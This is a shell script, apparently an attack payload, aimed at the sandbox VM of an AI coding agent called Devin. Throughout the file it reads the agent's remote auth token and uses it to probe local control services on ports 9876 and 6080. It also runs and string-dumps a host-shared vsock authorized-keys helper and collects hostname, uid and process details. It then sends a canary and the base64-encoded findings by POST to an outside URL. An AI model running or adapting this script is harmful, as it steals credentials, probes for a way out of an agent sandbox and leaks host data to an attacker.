#!/bin/sh
# i73134 v3: characterize devin-remote 9876 (token accepted -> 405 POST required) + vendor vsock helper
U="$1"
W=/tmp/i73134v3; mkdir -p "$W"; R=$W/raw.txt; : >"$R"
export LC_ALL=C
post(){ f="$1"; tag="$2"; code=$(curl -sS -o /dev/null -w '%{http_code}' --max-time 25 -X POST --data-binary @"$f" "$U/$tag" 2>/dev/null); echo "POST $tag CODE=$code BYTES=$(wc -c <"$f")" >>"$R"; }
printf 'canary3 host=%s uid=%s\n' "$(hostname)" "$(id -u)" > "$W/c.txt"; post "$W/c.txt" canary

hdr(){ printf '\n===== %s =====\n' "$*" >>"$R"; }
hdr LISTEN; ss -lntp 2>/dev/null | grep -E '6080|6789|9876|LISTEN' | head -20 >>"$R" 2>&1
hdr DEVR_CMD; for p in $(pgrep -f devin-remote 2>/dev/null); do echo PID=$p; tr '\0' ' ' </proc/$p/cmdline 2>/dev/null; echo; ls -l /proc/$p/cwd /proc/$p/exe 2>/dev/null; done >>"$R" 2>&1

hdr HELPER_HELP; timeout 6 /mnt/host_share/vsock-authorized-keys --help >>"$R" 2>&1; echo "rc=$?" >>"$R"
hdr HELPER_VER; timeout 6 /mnt/host_share/vsock-authorized-keys --version >>"$R" 2>&1; echo "rc=$?" >>"$R"
hdr HELPER_NUMSTR; strings -n4 /mnt/host_share/vsock-authorized-keys 2>/dev/null | grep -E '^[0-9]{2,6}$' | sort -u | head -40 >>"$R" 2>&1
hdr HELPER_NETS; strings -n6 /mnt/host_share/vsock-authorized-keys 2>/dev/null | grep -Ei 'AF_VSOCK|VMADDR|CID|/dev/vsock|8888|vsock://|devin|cognition|host_share|sshd|authorized_keys|attempt|timeout' | head -60 >>"$R" 2>&1
hdr HELPER_RUN; timeout 8 /mnt/host_share/vsock-authorized-keys ubuntu >>"$R" 2>&1; echo "rc=$?" >>"$R"

T1=$(tr -d '\r\n' </opt/.devin/devin_remote_auth_token 2>/dev/null)
hprobe(){ m="$1"; url="$2"; tag="$3"; f="$W/h_${tag}.bin"; code=$(curl -sS -k -o "$f" -w '%{http_code}' --max-time 6 -X "$m" -H "Authorization: Bearer $T1" -H 'Content-Type: application/json' --data '{}' "$url" 2>"$W/h_${tag}.err"); echo "PROBE $tag $m $url CODE=$code LEN=$(wc -c <"$f" 2>/dev/null) ERR=$(head -c 120 "$W/h_${tag}.err" 2>/dev/null) BODY=$(head -c 400 "$f" 2>/dev/null | tr '\n\r' '  ')" >>"$R"; }
hdr HTTP_PROBES
hprobe POST http://127.0.0.1:9876/ p9876root
hprobe GET  http://127.0.0.1:9876/ g9876root
hprobe GET  http://127.0.0.1:9876/openapi.json g9876oa
hprobe GET  http://127.0.0.1:9876/health g9876h
hprobe GET  https://127.0.0.1:6080/ g6080tls
hprobe POST https://127.0.0.1:6080/ p6080tls
hdr TAIL; base64 -w0 "$W/raw.txt" >"$W/p2.b64"; post "$W/p2.b64" part2
echo PAYLOAD_OK; exit 0
